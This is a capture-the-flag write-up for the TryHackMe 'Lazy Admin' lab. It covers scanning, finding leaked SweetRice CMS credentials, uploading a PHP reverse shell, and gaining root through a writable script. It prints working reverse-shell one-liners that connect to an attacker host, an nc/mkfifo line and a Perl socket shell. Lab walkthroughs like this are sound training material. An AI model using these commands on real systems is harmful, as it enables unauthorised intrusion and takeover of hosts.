# [Lazy Admin THM Room](https://tryhackme.com/room/lazyadmin)
## Scanning
### Nmap
```bash
nmap -sC -sV -oN nmapInitial [ip]
```
#### Output
```python
Starting Nmap 7.60 ( https://nmap.org ) at 2023-09-12 21:58 BST
Nmap scan report for ip-10-10-239-67.eu-west-1.compute.internal (target-ip)
Host is up (0.011s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:00:F1:4E:7D:6D (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.49 seconds
```

### Gobuster
#### Scan on http://target-ip
```bash
gobuster dir -u http://[ip] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
##### Output
```python
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://target-ip
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/09/12 22:01:25 Starting gobuster
===============================================================
/content (Status: 301)
/server-status (Status: 403)
===============================================================
2023/09/12 22:01:52 Finished
===============================================================
```

#### Scan on http://target-ip/content
```bash
gobuster dir -u http://[ip]/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

##### Output
```python
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.128.95/content
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/09/14 16:30:33 Starting gobuster
===============================================================
/images (Status: 301)
/js (Status: 301)
/inc (Status: 301)
/as (Status: 301)
/_themes (Status: 301)
/attachment (Status: 301)
===============================================================
2023/09/14 16:30:59 Finished
===============================================================
```

## Enumeration
### Port 80
- Going the the IP address shows a default Apache webserver page.
- [Gobuster](https://github.com/OJ/gobuster) gave us information regarding a sub-directory titled `/content`, which displays a page that shows the following:

![Sweertrice CMS](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/1303aaf2-538d-4d75-a8e2-51fe8da2b0f3)


- Running [Gobuster](https://github.com/OJ/gobuster) on the `/content` shows a collection of other directories, including:
- `/as`
- `/js`
- `/inc`
- `/_themes`
- `/attachment`

- Visiting the `http://[ip]/content/as` shows the following login page:

![Sweetrice Login Page](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/454fb75a-29df-4e77-a21a-306bf431d30e)


- Looking around more, we can see that there are a bunch of files in the `/inc` directory, including php files, and a MySQL backup file. 
- The contents of the MySQL backup file hold the following credentials:
	- User: manager
	- Password (once hash is cracked): Password123

![MySQL Backup File](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/89b2a763-a8af-48f9-b206-188e5d5590ce)


- These credentials can be used to log into the admin page shown earlier. Once entered, we are greeted with the following landing page:

![Logged Into SweetRice](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/ba9ee1d3-6b1d-428f-ad2a-38fff6efae1e)


## System Hacking
- Once we toggle the Website Status to Running, we can go back to the website `/content` directory and view the webpage. It's a basic hello world web page, but upon further inspection, the source code references a few other URLs that we can take a look at. One of them is an Ads page, where we can load a php reverse shell:

![Ads Admin](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/a3d1b41a-b674-430b-b258-2af08325884c)


***Note: I have already loaded the php reverse shell payload from the Pentest Monkey GitHub page.***

- Once this is loaded, we can navigate to the `/content/inc/ads` directory through the URL, where we can see the reverse shell we have uploaded. Ensure there is a [Netcat](https://nmap.org/ncat/)  listener on the attacking machine, and click the payload to spawn a reverse shell. 
- You can use the following Python syntax to stabilize the shell. 
```python
python3 -c 'import pty;pty.spawn("bin/bash")'
```

- From here, we can navigate to the `/home/itguy` directory and grab the flag. 

## Privilege Escalation
- When running `sudo -l`, we can see that we can run a `backup.pl` file with root permissions. This file is in the `/home/itguy` folder, and contains the following:
```perl
cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

- This script calls another script: `/etc/copy.sh`. We can use the following syntax to throw a quick reverse shell that will connect back to our attacking machine into the `copy.sh` script when the `backup.pl` script is run:
```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacking-ip 4444 >/tmp/f' > /etc/copy.sh
```

- Make sure a [Netcat](https://nmap.org/ncat/) listener is started and run the following syntax:
```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

- We are now root and can grab the contents of `root.txt` from the `/root` directory. 

## Rabbit Holes
### Metasploit
- I attempted to search for different vulnerabilities during the initial enumeration, and the SweetRice platform had a collection of known vulnerabilities. I decided to use [Searchsploit](https://www.exploit-db.com/searchsploit) through [[Metasploit]] to see if there were any modules I could use to make system hacking easier. After looking around, [[Exploit Databases|Searchsploit]] did list some exploits, but it didn't look like they were loaded in [Metasploit](https://www.metasploit.com/), so that didn't really work out. 

### PoC Exploit Code on Vulners
- I began my search by looking for default credentials for the SweetRice CMS once I discovered the admin login page. This led me to a website for resetting admin credentials with proof of concept code. That website can be found [here](https://vulners.com/securityvulns/SECURITYVULNS:DOC:25071). When using the following syntax in the URL address bar from the PoC code, I was greeted with a different page:

- Syntax:
```
http://[ip]/as//index.php?type=password&mod=resetok" method="post"
```

- New page:
![Admin Password Reset](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/0b40fbac-7f8a-4a39-a740-518ff17292f3)


- Since I couldn't find an administrative email, I couldn't actually figure out how to use this exploit. There may be a way to set up something to capture and manipulate traffic using [Burp Suite](https://portswigger.net/burp), but that is outside of my skill level. So I decided to look at other directories and eventually found credentials in the MySQL backup file. 
- In a similar vein, [Packet Storm](https://packetstormsecurity.com/files/139521/SweetRice-1.5.1-Code-Execution.html) shows a code execution exploit PoC that I spent entirely too much time looking at. 

### SQL Execute
- Once we toggle the Website Status to Running, we can go back to the website `/content` directory and view the webpage. It's a basic hello world web page, but upon further inspection, the source code references a few other URLs that we can take a look at. One of them is an SQL execution page:

![SQL Execution Page](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/4940943c-da3c-4c80-b17a-2ab4b7a0e3fc)


***Note: This will also be shown if you just press the orange button on the right hand side of the screen. My browser wasn't maximized, so I did extra work for nothing.***

### SSH
- Recovered credentials from the MySQL backup file do not work when attempting to authenticate through SSH.
- There was a creds file in the `/home/itguy` directory for MySQL that contained the following:
	- User: rice
	- Password: randompass
- This didn't authenticate to SSH either, and I didn't end up using SSH at all for this challenge. 

### Accidentally Rev Shelling into My Attacking Machine
- Since we're logged in as the `www-data` user, we may as well check and see what sudo permissions we have. Using `sudo -l`, we can see that we can run perl as root without a password. Privilege escalation is as easy as going to [GTFOBins](https://gtfobins.github.io/) and grabbing the following syntax:
```perl
export RHOST=[attacker ip]
export RPORT=8888
perl -e 'use Socket;$i="$ENV{RHOST}";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

- Make sure a listener is set up on the attacking host using `nc -lvp 8888` then run the above code. Once done, a reverse shell with root permissions should be spawned and we can grab the following from the root directory:
	- root.txt

Is what I WOULD HAVE said had I paid more attention. I basically just ended up running this and gaining a reverse shell onto my attacking machine by putting it in the wrong terminal. This didn't work. 
